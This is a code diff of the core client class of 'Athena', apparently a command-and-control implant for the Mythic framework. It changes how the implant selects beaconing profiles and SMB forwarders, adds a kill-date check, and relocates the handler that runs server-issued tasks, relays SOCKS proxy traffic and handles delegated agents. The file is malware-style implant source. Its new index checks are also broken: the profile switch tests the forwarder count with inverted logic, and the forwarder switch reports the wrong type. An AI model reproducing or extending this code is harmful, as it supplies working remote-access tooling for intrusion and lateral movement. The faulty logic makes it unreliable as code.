@@ -1,5 +1,6 @@
 ﻿using Athena.Commands;
 using Athena.Commands.Model;
+using Athena.Models;
 using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Checkin;
 using Athena.Models.Mythic.Tasks;
@@ -9,32 +10,31 @@ using Athena.Models.Config;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Linq;
 using System.Net;
+using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
-using System.Reflection;
-using System.Linq;
-using Athena.Models;
 
 namespace Athena
 {
     public class AthenaClient
     {
-        public EventHandler SetSleep;
         public IProfile profile { get; set; }
         public IForwarder forwarder { get; set; }
         public CommandHandler commandHandler { get; set; }
         public SocksHandler socksHandler { get; set; }
         public bool exit { get; set; }
-        Dictionary<string, IProfile> availableProfiles { get; set; }
-        Dictionary<string, IForwarder> availableForwarders { get; set; }
+        List<IProfile> availableProfiles { get; set; }
+        List<IForwarder> availableForwarders { get; set; }
         public AthenaClient()
         {
             this.exit = false;
             this.availableProfiles = GetProfiles();
             this.availableForwarders = GetForwarders();
-            this.profile = SelectProfile(null);
-            this.forwarder = SelectForwarder(null);
+            this.profile = SelectProfile(0);
+            this.forwarder = SelectForwarder(0);
+            this.socksHandler = new SocksHandler();
             this.commandHandler = new CommandHandler();
             this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
             this.commandHandler.StartForwarder += StartForwarder;
@@ -44,70 +44,32 @@ namespace Athena
             this.commandHandler.StopSocks += StopSocks;
             this.commandHandler.ExitRequested += ExitRequested;
             this.commandHandler.SetProfile += SetProfile;
-            this.socksHandler = new SocksHandler();
 
         }
         /// <summary>
         /// Select the initial C2 Profile Configuration
         /// </summary>
         /// <param name="choice">The config to switch to, if null a random one will be selected</param>
-        private IProfile SelectProfile(string choice)
+        private IProfile SelectProfile(int choice)
         {
-#if NATIVEAOT
-            if(choice is null)
-                return availableProfiles.FirstOrDefault().Value;
-#endif
-            if (String.IsNullOrEmpty(choice))
-            {
-                Random rand = new Random(); //Select profile at random from available ones
-                return availableProfiles.ElementAt(rand.Next(0, availableProfiles.Count)).Value;
-            }
-            else
-            {
-                if (this.availableProfiles.ContainsKey($"ATHENA.PROFILES.{choice.ToUpper()}"))
-                {
-                    //Switch to the requested profile
-                    return this.availableProfiles[$"ATHENA.PROFILES.{choice.ToUpper()}"];
-                }
-                else
-                {
-                    //Don't make any changes
-                    return this.profile;
-                }
-            }
+            return this.availableProfiles[choice];
         }
         /// <summary>
         /// Select the initial SMB Forwarder
         /// </summary>
         /// <param name="choice">The forwarder to switch to, if null a random one will be selected</param>
-        private IForwarder SelectForwarder(string choice)
+        private IForwarder SelectForwarder(int choice)
         {
-            if (String.IsNullOrEmpty(choice))
-            {
-                Random rand = new Random(); //Select profile at random from available 
-                return availableForwarders.ElementAt(rand.Next(0, availableForwarders.Count)).Value;
-            }
-            else
-            {
-                if (this.availableProfiles.ContainsKey((choice)))
-                {
-                    //Switch to the requested profile
-                    return this.availableForwarders[choice];
-                }
-                else
-                {
-                    //Don't make any changes
-                    return this.forwarder;
-                }
-            }
+            return this.availableForwarders[choice];
         }
+
         /// <summary>
         /// Get available C2 Profile Configurations
         /// </summary>
-        private Dictionary<string, IProfile> GetProfiles()
+        private List<IProfile> GetProfiles()
         {
             List<string> profiles = new List<string>();
-            Dictionary<string, IProfile> configs = new Dictionary<string, IProfile>();
+            List<IProfile> configs = new List<IProfile>();
 #if WEBSOCKET
 profiles.Add("Athena.Profiles.Websocket");
 #endif
@@ -147,78 +109,34 @@ profiles.Add("Athena.Profiles.SMB");
                         {
                             Debug.WriteLine($"[{DateTime.Now}] Adding profile: {profile}");
                             IProfile config = (IProfile)Activator.CreateInstance(t);
+                            
+                            //Make sure we haven't hit one of the expiration dates
+                            Misc.CheckExpiration(config.killDate);
+
+                            //Subscribe to TaskingReceived events
                             Debug.WriteLine($"[{DateTime.Now}] Subscribing to OntaskingReceived");
                             config.SetTaskingReceived += OnTaskingReceived;
-                            configs.Add(profile.ToUpper(), config);
+
+                            //Add profile to our tracker
+                            configs.Add(config);
                         }
                     }
                 }
                 catch
                 {
-                    continue;
+                    Debug.WriteLine($"[{DateTime.Now}] Failed to load assembly for {profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
                 }
             }
 #endif
             return configs;
         }
-
-        private void OnTaskingReceived(object sender, TaskingReceivedArgs args)
-        {
-            //Pass up socks messages
-            if (args.tasking_response.socks is not null)
-            {
-                try
-                {
-                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.socks.Count} socks messages.");
-                    HandleSocks(args.tasking_response.socks);
-                }
-                catch (Exception e)
-                {
-                    Debug.WriteLine(e.ToString());
-
-                }
-            }
-
-            if (args.tasking_response.delegates is not null )
-            {
-                try
-                {
-                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.delegates.Count} delegates.");
-                    HandleDelegates(args.tasking_response.delegates);
-                }
-                catch (Exception e)
-                {
-                    Debug.WriteLine(e.ToString());
-                }
-            }
-
-            if (args.tasking_response.responses is not null)
-            {
-                try
-                {
-                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.responses.Count} Mythic responses. (Upload/Download)");
-                    HandleMythicResponses(args.tasking_response.responses);
-                }
-                catch (Exception e)
-                {
-                    Debug.WriteLine(e.ToString());
-                }
-            }
-            Parallel.ForEach(args.tasking_response.tasks, async c =>
-            {
-                Debug.WriteLine($"[{DateTime.Now}] Executing task with ID: {c.id}");
-                //Does this need to be a Task.Run()?
-                Task.Run(() => this.commandHandler.StartJob(c));
-            });
-        }
-
         /// <summary>
         /// Get available forwarder Configurations
         /// </summary>
-        private Dictionary<string, IForwarder> GetForwarders()
+        private List<IForwarder> GetForwarders()
         {
             List<string> profiles = new List<string>();
-            Dictionary<string, IForwarder> forwarders = new Dictionary<string, IForwarder>();
+            List<IForwarder> forwarders = new List<IForwarder>();
 #if SMBFWD
             profiles.Add("Athena.Forwarders.SMB");
 #else
@@ -243,13 +161,13 @@ profiles.Add("Athena.Profiles.SMB");
                         if (typeof(IForwarder).IsAssignableFrom(t))
                         {
                             Debug.WriteLine($"[{DateTime.Now}] Adding Forwarder: {profile}");
-                            forwarders.Add(profile, (IForwarder)Activator.CreateInstance(t));
+                            forwarders.Add((IForwarder)Activator.CreateInstance(t));
                         }
                     }
                 }
                 catch
                 {
-
+                    Debug.WriteLine($"[{DateTime.Now}] Failed to load assembly for {profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
                 }
             }
 #endif
@@ -300,6 +218,56 @@ profiles.Add("Athena.Profiles.SMB");
         /// </summary>
         /// <param name="responseString">Response from the Mythic server</param>
 
+        private async Task OnTaskingReceived(object sender, TaskingReceivedArgs args)
+        {
+            //Pass up socks messages
+            if (args.tasking_response.socks is not null)
+            {
+                try
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.socks.Count} socks messages.");
+                    HandleSocks(args.tasking_response.socks);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine(e.ToString());
+
+                }
+            }
+
+            if (args.tasking_response.delegates is not null)
+            {
+                try
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.delegates.Count} delegates.");
+                    HandleDelegates(args.tasking_response.delegates);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine(e.ToString());
+                }
+            }
+
+            if (args.tasking_response.responses is not null)
+            {
+                try
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.responses.Count} Mythic responses. (Upload/Download)");
+                    HandleMythicResponses(args.tasking_response.responses);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine(e.ToString());
+                }
+            }
+            Parallel.ForEach(args.tasking_response.tasks, async c =>
+            {
+                Debug.WriteLine($"[{DateTime.Now}] Executing task with ID: {c.id}");
+                //Does this need to be a Task.Run()?
+                Task.Run(() => this.commandHandler.StartJob(c));
+            });
+        }
+
         #endregion
         #region Helper Functions
         /// <summary>
@@ -331,7 +299,7 @@ profiles.Add("Athena.Profiles.SMB");
             }
             result.user_output = sb.ToString();
 
-            _ = commandHandler.AddResponse(result.ToJson());
+            TaskResponseHandler.AddResponse(result.ToJson());
 
         }
         /// <summary>
@@ -341,27 +309,29 @@ profiles.Add("Athena.Profiles.SMB");
         /// <param name="e">ProfileEventArgs containing the MythicJob object</param>
         private void SetProfile(object sender, ProfileEventArgs e)
         {
-            StringBuilder sb = new StringBuilder();
-            ResponseResult result = new ResponseResult()
+            var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
+            int choice;
+            var response = new ResponseResult
             {
                 completed = true,
                 task_id = e.job.task.id,
-            };
-            //var profileInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(e.job.task.parameters);
-            var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
-            try
-            {
-                this.profile = SelectProfile(profileInfo["name"]);
-                sb.AppendLine($"Updated profile to: {profileInfo["name"]}");
-            }
-            catch (Exception ex)
-            {
-                sb.AppendLine("Invalid profile specified" + Environment.NewLine + ex.ToString());
-                result.status = "error";
-            }
-            result.user_output = sb.ToString();
 
-            _ = commandHandler.AddResponse(result.ToJson());
+            };
+
+            if (int.TryParse(profileInfo["id"], out choice) && !(this.availableForwarders.Count > choice))
+            {
+                this.profile.StopBeacon();
+                this.profile = SelectProfile(choice);
+                this.profile.StartBeacon();
+                response.user_output = $"Updated profile to: {this.profile.GetType()}";
+            }
+            else
+            {
+                response.user_output = "Invalid profile specified";
+                response.status = "error";
+            }
+            TaskResponseHandler.AddResponse(response);
+            return;
         }
         /// <summary>
         /// EventHandler to set the current forwarder
@@ -370,27 +340,30 @@ profiles.Add("Athena.Profiles.SMB");
         /// <param name="e">ProfileEventArgs containing the MythicJob object</param>
         private void SetForwarder(object sender, ProfileEventArgs e)
         {
-            StringBuilder sb = new StringBuilder();
-            ResponseResult result = new ResponseResult()
+            var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
+            
+            int choice;
+
+            var response = new ResponseResult
             {
                 completed = true,
                 task_id = e.job.task.id,
-            };
-            //var profileInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(e.job.task.parameters);
-            var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
-            try
-            {
-                this.forwarder = SelectForwarder(profileInfo["profile"]);
-                sb.AppendLine($"Updated forwarder to: {profileInfo["profile"]}");
-            }
-            catch
-            {
-                sb.AppendLine("Invalid forwarder specified");
-                result.status = "error";
-            }
-            result.user_output = sb.ToString();
 
-            _ = commandHandler.AddResponse(result.ToJson());
+            };
+
+            if (int.TryParse(profileInfo["profile"], out choice) && !(this.availableForwarders.Count > choice))
+            {
+                this.forwarder = SelectForwarder(choice);
+                response.user_output = $"Updated forwarder to: {this.profile.GetType()}";
+            }
+            else
+            {
+                response.user_output = "Invalid forwarder specified";
+                response.status = "error";
+            }
+
+            TaskResponseHandler.AddResponse(response);
+            return;
         }
         /// <summary>
         /// EventHandler to start the forwarder
@@ -401,14 +374,12 @@ profiles.Add("Athena.Profiles.SMB");
         {
             var res = this.forwarder.Link(e.job, this.profile.uuid).Result;
 
-            ResponseResult result = new ResponseResult()
+            TaskResponseHandler.AddResponse(new ResponseResult()
             {
                 completed = true,
                 task_id = e.job.task.id,
                 user_output = res ? "Forwarder started" : "Forwarder failed to start",
-            };
-
-            _ = commandHandler.AddResponse(result.ToJson());
+            });
         }
         /// <summary>
         /// EventHandler to stop the forwarder
@@ -418,7 +389,7 @@ profiles.Add("Athena.Profiles.SMB");
         private void StopForwarder(object sender, TaskEventArgs e)
         {
             this.forwarder.Unlink();
-            _ = commandHandler.AddResponse(new ResponseResult
+            TaskResponseHandler.AddResponse(new ResponseResult
             {
                 user_output = "Unlinked from agent",
                 task_id = e.job.task.id,
@@ -434,7 +405,7 @@ profiles.Add("Athena.Profiles.SMB");
         {
             if (this.socksHandler.Start().Result)
             {
-                _ = this.commandHandler.AddResponse(new ResponseResult
+                TaskResponseHandler.AddResponse(new ResponseResult
                 {
                     user_output = "Socks Started",
                     completed = true,
@@ -443,7 +414,7 @@ profiles.Add("Athena.Profiles.SMB");
             }
             else
             {
-                _ = this.commandHandler.AddResponse(new ResponseResult
+                TaskResponseHandler.AddResponse(new ResponseResult
                 {
                     user_output = "Failed to start socks",
                     completed = true,
@@ -461,7 +432,7 @@ profiles.Add("Athena.Profiles.SMB");
         {
             if (this.socksHandler.Stop().Result)
             {
-                _ = this.commandHandler.AddResponse(new ResponseResult
+                TaskResponseHandler.AddResponse(new ResponseResult
                 {
                     user_output = "Socks stopped",
                     completed = true,
@@ -470,7 +441,7 @@ profiles.Add("Athena.Profiles.SMB");
             }
             else
             {
-                _ = this.commandHandler.AddResponse(new ResponseResult
+                TaskResponseHandler.AddResponse(new ResponseResult
                 {
                     user_output = "Failed to stop socks",
                     completed = true,
@@ -486,7 +457,7 @@ profiles.Add("Athena.Profiles.SMB");
         /// <param name="e">TaskEventArgs containing the MythicJob object</param>
         private void ExitRequested(object sender, TaskEventArgs e)
         {
-            _ = this.commandHandler.AddResponse(new ResponseResult
+            TaskResponseHandler.AddResponse(new ResponseResult
             {
                 user_output = @"Wisdom's daughter walks alone. The mark of Athena burns through Rome",
                 completed = true,
@@ -550,7 +521,7 @@ profiles.Add("Athena.Profiles.SMB");
         {
             try
             {
-                foreach (IProfile config in availableProfiles.Values)
+                foreach (IProfile config in availableProfiles)
                 {
                     config.uuid = res.id;
                     if (config.encrypted)
